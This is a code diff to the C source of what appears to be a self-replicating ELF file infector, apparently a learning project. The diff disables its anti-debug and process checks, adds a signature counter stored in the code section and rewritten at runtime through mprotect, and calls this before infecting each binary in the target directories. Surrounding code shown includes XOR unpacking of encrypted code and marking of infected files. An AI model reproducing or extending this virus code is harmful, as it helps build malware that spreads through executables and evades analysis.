@@ -7,10 +7,10 @@ int   entry_point(void *magic) {
   char    infectDir2[] = "/tmp/test2";
   char    procName[] = "/proc/";
 
-  if (checkProcess(procName) != 0)
-    return (stop(1, magic));
-  if (preventDebug(magic) != 0)
-    return (stop(1, magic));
+  /* if (checkProcess(procName) != 0) */
+  /*   return (stop(1, magic)); */
+  /* if (preventDebug(magic) != 0) */
+  /*   return (stop(1, magic)); */
   if (magic != (void *)0x42) {
     if (unObfuscate() == -1)
       return (stop(1, magic));
@@ -55,13 +55,6 @@ static void *align(size_t value) {
   return (void *)(((value + (4096 - 1)) & -4096) - 4096);
 }
 
-static void updateSignature(void) {
-  size_t  *signature;
-
-  signature = (void *)dynamicSignature + 4;
-  *signature -= 1;
-}
-
 static int unObfuscate(void) {
   size_t  i;
   size_t  size;
@@ -78,7 +71,6 @@ static int unObfuscate(void) {
     code[i] ^= 0xa5;
     i += 1;
   }
-  updateSignature();
   if (mprotect(aligned, size + ((void *)encryptStart - aligned), PROT_EXEC | PROT_READ) < 0)
     return (-1);
   return (0);
@@ -497,16 +489,50 @@ static ssize_t  getrandom(void *buf, size_t buflen, unsigned int flags) {
   return (ret);
 }
 
-static void       dynamicSignature(void) {
-  asm("nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop\n\t"
-      "nop");
+static size_t atoi(const char *str) {
+  int     i;
+  size_t  result;
+
+  i = 0;
+  result = 0;
+  while (i < 8) {
+    result = result * 10 + (str[i] - 48);
+    i += 1;
+  }
+  return (result);
 }
+
+static int updateSignature(void) {
+  size_t  i;
+  size_t  *tmp;
+  char    *str;
+  size_t  signature;
+
+  str = (void *)dynamicSignature - sizeof(size_t);
+  if (mprotect(align((size_t)dynamicSignature - sizeof(size_t)), sizeof(size_t), PROT_WRITE | PROT_EXEC | PROT_READ) < 0)
+    return (-1);
+  signature = atoi((void *)dynamicSignature - sizeof(size_t));
+  signature -= 1;
+  i = 0;
+  while (signature != 0) {
+    str[i] = signature % 10 + 48;
+    signature /= 10;
+    i += 1;
+  }
+  tmp = (size_t *)str;
+  *tmp = (((*tmp & 0xff) << 56) | ((*tmp & 0xff00) << 40) |
+        ((*tmp & 0xff0000) << 24) | ((*tmp & 0xff000000) << 8) |
+        ((*tmp & 0xff00000000) >> 8) | ((*tmp & 0xff0000000000) >> 24) |
+        ((*tmp & 0xff000000000000) >> 40) | ((*tmp & 0xff00000000000000) >> 56));
+  if (mprotect(align((size_t)dynamicSignature - sizeof(size_t)), sizeof(size_t), PROT_EXEC | PROT_READ) < 0)
+    return (-1);
+  return (0);
+}
+
+const char  signatureNbr[8] __attribute__ ((section (".text#"))) = {
+  "\x34\x32\x34\x32\x34\x32\x34\x32"
+};
+static void       dynamicSignature(void) {}
 
 static int  mapFile(const char *dirname, const char *filename, struct bfile *bin) {
   int         fd;
@@ -592,7 +618,7 @@ static void  appendSignature(struct bfile file) {
 
   len = strlen(payload);
   memcpy(((void *)file.header) + file.size - len - sizeof(size_t) - 1, payload, len);
-  memcpy(((void *)file.header) + file.size - sizeof(size_t) - 1, (void *)dynamicSignature + 4, sizeof(size_t));
+  memcpy(((void *)file.header) + file.size - sizeof(size_t) - 1, (void *)dynamicSignature - sizeof(size_t), sizeof(size_t));
   memset(((void *)file.header) + file.size - 1, 0, 1);
   file.header->e_ident[EI_OSABI] = 0x10;
 }
@@ -832,9 +858,11 @@ static int  infectBins(const char *dirname) {
       if (isInfected(bin)) {
         close(bin.fd);
         munmap(bin.header, bin.size);
-      } else
+      } else {
+        updateSignature();
         if (infectFile(bin) == -1)
           return (-1);
+      }
     }
     bpos += dirp->d_reclen;
   }
